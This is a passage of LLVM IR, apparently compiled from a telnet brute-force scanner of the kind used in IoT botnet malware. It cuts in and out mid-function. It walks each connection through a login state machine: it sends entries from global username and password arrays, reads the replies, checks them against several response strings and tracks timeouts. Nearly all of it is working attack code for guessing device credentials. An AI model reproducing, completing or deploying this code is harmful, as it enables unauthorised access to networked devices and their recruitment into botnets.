  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 0
  %652 = load i32, i32* %651, align 16
  %653 = call i32 @sclose(i32 %652)
  %654 = load i32, i32* %2, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %655
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %656, i32 0, i32 2
  store i8 0, i8* %657, align 8
  %658 = load i32, i32* %2, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 3
  store i8 1, i8* %661, align 1
  br label %662

; <label>:662:                                    ; preds = %647, %638
  br label %2046

; <label>:663:                                    ; preds = %68
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 0
  %668 = load i32, i32* %667, align 16
  %669 = load i32, i32* %2, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 4
  %673 = load i8, i8* %672, align 2
  %674 = zext i8 %673 to i64
  %675 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %674
  %676 = load i8*, i8** %675, align 8
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 4
  %681 = load i8, i8* %680, align 2
  %682 = zext i8 %681 to i64
  %683 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %682
  %684 = load i8*, i8** %683, align 8
  %685 = call i64 @strlen(i8* %684) #10
  %686 = call i64 @send(i32 %668, i8* %676, i64 %685, i32 16384)
  %687 = icmp slt i64 %686, 0
  br i1 %687, label %688, label %703

; <label>:688:                                    ; preds = %663
  %689 = load i32, i32* %2, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 0
  %693 = load i32, i32* %692, align 16
  %694 = call i32 @sclose(i32 %693)
  %695 = load i32, i32* %2, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 2
  store i8 0, i8* %698, align 8
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 3
  store i8 1, i8* %702, align 1
  br label %2047

; <label>:703:                                    ; preds = %663
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 0
  %708 = load i32, i32* %707, align 16
  %709 = call i64 @send(i32 %708, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %710 = icmp slt i64 %709, 0
  br i1 %710, label %711, label %726

; <label>:711:                                    ; preds = %703
  %712 = load i32, i32* %2, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 0
  %716 = load i32, i32* %715, align 16
  %717 = call i32 @sclose(i32 %716)
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 2
  store i8 0, i8* %721, align 8
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 3
  store i8 1, i8* %725, align 1
  br label %2047

; <label>:726:                                    ; preds = %703
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 2
  store i8 4, i8* %730, align 8
  br label %2046

; <label>:731:                                    ; preds = %68
  %732 = load i32, i32* %2, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 6
  %736 = load i32, i32* %735, align 4
  %737 = icmp eq i32 %736, 0
  br i1 %737, label %738, label %744

; <label>:738:                                    ; preds = %731
  %739 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 6
  store i32 %739, i32* %743, align 4
  br label %744

; <label>:744:                                    ; preds = %738, %731
  %745 = load i32, i32* %2, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 0
  %749 = load i32, i32* %748, align 16
  %750 = load i32, i32* %2, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 8
  %754 = load i8*, i8** %753, align 8
  %755 = load i32, i32* %2, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 7
  %759 = load i16, i16* %758, align 16
  %760 = zext i16 %759 to i32
  %761 = call i32 @readUntil(i32 %749, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %754, i32 1024, i32 %760)
  %762 = icmp ne i32 %761, 0
  br i1 %762, label %763, label %795

; <label>:763:                                    ; preds = %744
  %764 = load i32, i32* %2, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 6
  store i32 0, i32* %767, align 4
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 7
  store i16 0, i16* %771, align 16
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 8
  %776 = load i8*, i8** %775, align 8
  %777 = call i8* @strstr(i8* %776, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %778 = icmp ne i8* %777, null
  br i1 %778, label %779, label %784

; <label>:779:                                    ; preds = %763
  %780 = load i32, i32* %2, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 2
  store i8 5, i8* %783, align 8
  br label %789

; <label>:784:                                    ; preds = %763
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 2
  store i8 7, i8* %788, align 8
  br label %789

; <label>:789:                                    ; preds = %784, %779
  %790 = load i32, i32* %2, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 8
  %794 = load i8*, i8** %793, align 8
  call void @llvm.memset.p0i8.i64(i8* %794, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:795:                                    ; preds = %744
  %796 = load i32, i32* %2, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 0
  %800 = load i32, i32* %799, align 16
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 8
  %805 = load i8*, i8** %804, align 8
  %806 = load i32, i32* %2, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %807
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %808, i32 0, i32 7
  %810 = load i16, i16* %809, align 16
  %811 = zext i16 %810 to i32
  %812 = call i32 @readUntil(i32 %800, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %805, i32 1024, i32 %811)
  %813 = icmp ne i32 %812, 0
  br i1 %813, label %814, label %846

; <label>:814:                                    ; preds = %795
  %815 = load i32, i32* %2, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %816
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %817, i32 0, i32 6
  store i32 0, i32* %818, align 4
  %819 = load i32, i32* %2, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 7
  store i16 0, i16* %822, align 16
  %823 = load i32, i32* %2, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 8
  %827 = load i8*, i8** %826, align 8
  %828 = call i8* @strstr(i8* %827, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %829 = icmp ne i8* %828, null
  br i1 %829, label %830, label %835

; <label>:830:                                    ; preds = %814
  %831 = load i32, i32* %2, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %833, i32 0, i32 2
  store i8 5, i8* %834, align 8
  br label %840

; <label>:835:                                    ; preds = %814
  %836 = load i32, i32* %2, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 2
  store i8 7, i8* %839, align 8
  br label %840

; <label>:840:                                    ; preds = %835, %830
  %841 = load i32, i32* %2, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 8
  %845 = load i8*, i8** %844, align 8
  call void @llvm.memset.p0i8.i64(i8* %845, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:846:                                    ; preds = %795
  %847 = load i32, i32* %2, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 8
  %851 = load i8*, i8** %850, align 8
  %852 = call i8* @strstr(i8* %851, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %853 = icmp ne i8* %852, null
  br i1 %853, label %854, label %869

; <label>:854:                                    ; preds = %846
  %855 = load i32, i32* %2, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 0
  %859 = load i32, i32* %858, align 16
  %860 = call i32 @sclose(i32 %859)
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 2
  store i8 0, i8* %864, align 8
  %865 = load i32, i32* %2, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %867, i32 0, i32 3
  store i8 0, i8* %868, align 1
  br label %2047

; <label>:869:                                    ; preds = %846
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 8
  %874 = load i8*, i8** %873, align 8
  %875 = call i8* @strstr(i8* %874, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %876 = icmp ne i8* %875, null
  br i1 %876, label %877, label %892

; <label>:877:                                    ; preds = %869
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 0
  %882 = load i32, i32* %881, align 16
  %883 = call i32 @sclose(i32 %882)
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 2
  store i8 0, i8* %887, align 8
  %888 = load i32, i32* %2, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %889
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %890, i32 0, i32 3
  store i8 0, i8* %891, align 1
  br label %2047

; <label>:892:                                    ; preds = %869
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 8
  %897 = load i8*, i8** %896, align 8
  %898 = call i8* @strstr(i8* %897, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %899 = icmp ne i8* %898, null
  br i1 %899, label %900, label %915

; <label>:900:                                    ; preds = %892
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 0
  %905 = load i32, i32* %904, align 16
  %906 = call i32 @sclose(i32 %905)
  %907 = load i32, i32* %2, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %909, i32 0, i32 2
  store i8 0, i8* %910, align 8
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 3
  store i8 0, i8* %914, align 1
  br label %2047

; <label>:915:                                    ; preds = %892
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 8
  %920 = load i8*, i8** %919, align 8
  %921 = call i8* @strstr(i8* %920, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %922 = icmp ne i8* %921, null
  br i1 %922, label %923, label %938

; <label>:923:                                    ; preds = %915
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 0
  %928 = load i32, i32* %927, align 16
  %929 = call i32 @sclose(i32 %928)
  %930 = load i32, i32* %2, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 2
  store i8 0, i8* %933, align 8
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 3
  store i8 0, i8* %937, align 1
  br label %2047

; <label>:938:                                    ; preds = %915
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %941, i32 0, i32 8
  %943 = load i8*, i8** %942, align 8
  %944 = call i8* @strstr(i8* %943, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %945 = icmp ne i8* %944, null
  br i1 %945, label %946, label %961

; <label>:946:                                    ; preds = %938
  %947 = load i32, i32* %2, align 4
  %948 = sext i32 %947 to i64
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %948
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %949, i32 0, i32 0
  %951 = load i32, i32* %950, align 16
  %952 = call i32 @sclose(i32 %951)
  %953 = load i32, i32* %2, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 2
  store i8 0, i8* %956, align 8
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 3
  store i8 0, i8* %960, align 1
  br label %2047

; <label>:961:                                    ; preds = %938
  %962 = load i32, i32* %2, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 8
  %966 = load i8*, i8** %965, align 8
  %967 = call i8* @strstr(i8* %966, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %968 = icmp ne i8* %967, null
  br i1 %968, label %969, label %984

; <label>:969:                                    ; preds = %961
  %970 = load i32, i32* %2, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %971
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %972, i32 0, i32 0
  %974 = load i32, i32* %973, align 16
  %975 = call i32 @sclose(i32 %974)
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 2
  store i8 0, i8* %979, align 8
  %980 = load i32, i32* %2, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 3
  store i8 0, i8* %983, align 1
  br label %2047

; <label>:984:                                    ; preds = %961
  %985 = load i32, i32* %2, align 4
  %986 = sext i32 %985 to i64
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %986
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %987, i32 0, i32 8
  %989 = load i8*, i8** %988, align 8
  %990 = call i8* @strstr(i8* %989, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %991 = icmp ne i8* %990, null
  br i1 %991, label %992, label %1007

; <label>:992:                                    ; preds = %984
  %993 = load i32, i32* %2, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %994
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %995, i32 0, i32 0
  %997 = load i32, i32* %996, align 16
  %998 = call i32 @sclose(i32 %997)
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 2
  store i8 0, i8* %1002, align 8
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1005, i32 0, i32 3
  store i8 0, i8* %1006, align 1
  br label %2047

; <label>:1007:                                   ; preds = %984
  %1008 = load i32, i32* %2, align 4
  %1009 = sext i32 %1008 to i64
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1009
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1010, i32 0, i32 8
  %1012 = load i8*, i8** %1011, align 8
  %1013 = call i8* @strstr(i8* %1012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1014 = icmp ne i8* %1013, null
  br i1 %1014, label %1015, label %1030

; <label>:1015:                                   ; preds = %1007
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 16
  %1021 = call i32 @sclose(i32 %1020)
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 2
  store i8 0, i8* %1025, align 8
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 3
  store i8 0, i8* %1029, align 1
  br label %2047

; <label>:1030:                                   ; preds = %1007
  br label %1031

; <label>:1031:                                   ; preds = %1030
  br label %1032

; <label>:1032:                                   ; preds = %1031
  br label %1033

; <label>:1033:                                   ; preds = %1032
  br label %1034

; <label>:1034:                                   ; preds = %1033
  br label %1035

; <label>:1035:                                   ; preds = %1034
  br label %1036

; <label>:1036:                                   ; preds = %1035
  br label %1037

; <label>:1037:                                   ; preds = %1036
  %1038 = load i32, i32* %2, align 4
  %1039 = sext i32 %1038 to i64
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1039
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1040, i32 0, i32 8
  %1042 = load i8*, i8** %1041, align 8
  %1043 = call i64 @strlen(i8* %1042) #10
  %1044 = trunc i64 %1043 to i16
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 7
  store i16 %1044, i16* %1048, align 16
  br label %1049

; <label>:1049:                                   ; preds = %1037
  br label %1050

; <label>:1050:                                   ; preds = %1049
  %1051 = load i32, i32* %2, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 6
  %1055 = load i32, i32* %1054, align 4
  %1056 = add i32 %1055, 10
  %1057 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1058 = icmp ult i32 %1056, %1057
  br i1 %1058, label %1059, label %1074

; <label>:1059:                                   ; preds = %1050
  %1060 = load i32, i32* %2, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 0
  %1064 = load i32, i32* %1063, align 16
  %1065 = call i32 @sclose(i32 %1064)
  %1066 = load i32, i32* %2, align 4
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1067
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1068, i32 0, i32 2
  store i8 0, i8* %1069, align 8
  %1070 = load i32, i32* %2, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 3
  store i8 1, i8* %1073, align 1
  br label %1074

; <label>:1074:                                   ; preds = %1059, %1050
  br label %2046

; <label>:1075:                                   ; preds = %68
  %1076 = load i32, i32* %2, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1077
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1078, i32 0, i32 0
  %1080 = load i32, i32* %1079, align 16
  %1081 = load i32, i32* %2, align 4
  %1082 = sext i32 %1081 to i64
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1082
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1083, i32 0, i32 5
  %1085 = load i8, i8* %1084, align 1
  %1086 = zext i8 %1085 to i64
  %1087 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1086
  %1088 = load i8*, i8** %1087, align 8
  %1089 = load i32, i32* %2, align 4
  %1090 = sext i32 %1089 to i64
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1090
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1091, i32 0, i32 5
  %1093 = load i8, i8* %1092, align 1
  %1094 = zext i8 %1093 to i64
  %1095 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1094
  %1096 = load i8*, i8** %1095, align 8
  %1097 = call i64 @strlen(i8* %1096) #10
  %1098 = call i64 @send(i32 %1080, i8* %1088, i64 %1097, i32 16384)
  %1099 = icmp slt i64 %1098, 0
  br i1 %1099, label %1100, label %1115

; <label>:1100:                                   ; preds = %1075
  %1101 = load i32, i32* %2, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 0
  %1105 = load i32, i32* %1104, align 16
  %1106 = call i32 @sclose(i32 %1105)
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 2
  store i8 0, i8* %1110, align 8
  %1111 = load i32, i32* %2, align 4
  %1112 = sext i32 %1111 to i64
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1112
